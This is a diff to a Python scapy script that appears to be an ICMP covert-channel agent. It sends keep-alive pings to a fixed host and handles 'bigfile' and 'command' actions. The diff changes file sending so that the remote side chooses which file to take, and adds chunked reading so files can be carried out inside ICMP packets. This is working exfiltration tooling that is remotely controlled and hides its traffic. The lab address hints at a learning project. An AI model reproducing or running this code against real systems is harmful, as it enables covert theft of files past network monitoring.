@@ -3,10 +3,22 @@ import base64
 import time
 
 destination = "192.168.56.1"
-sniffInterface = "eth0"
+sniffInterface = "enp0s8"
 delayToKeepAlive = 5
 sendKeepAlive = True
 
+CHUNK_SIZE = 1024
+def chunkstring(string, length):
+    return (string[0+i:length+i] for i in range(0, len(string), length))
+
+def read_in_chunks(file_object, chunk_size=1024):
+    """Lazy function (generator) to read a file piece by piece.
+    Default chunk size: 1k."""
+    while True:
+        data = file_object.read(chunk_size)
+        if not data:
+            break
+        yield data
 
 def keepAlive():
     while(True):
@@ -66,12 +78,14 @@ if __name__ == "__main__":
             sendKeepAlive = True
 
         elif action == "bigfile":
-            fileName = input("Which file should we send ?\n")
-            
-            print("Sending protocol and filename")
+            sendKeepAlive = False
+
+            #print("Sending protocol and filename")
             # Protocole : type d'envoi (file/message)
-            p = sr1(IP(dst=destination)/ICMP()/"bigfile")
-            p = sr1(IP(dst=destination)/ICMP()/fileName)
+            #p = sr1(IP(dst=destination)/ICMP()/"bigfile")
+            #p = sr1(IP(dst=destination)/ICMP()/fileName)
+
+            fileName = sniffMessage().decode("utf-8")
 
             fileStats = os.stat(fileName)
             print(f'File Size in Bytes is {fileStats.st_size}')
@@ -91,6 +105,7 @@ if __name__ == "__main__":
             print("Sending bigfileSTOP")
             p = send(IP(dst=destination)/ICMP()/"bigfileSTOP")
 
+            sendKeepAlive = True
         elif action == "command":
 
             sendKeepAlive = False
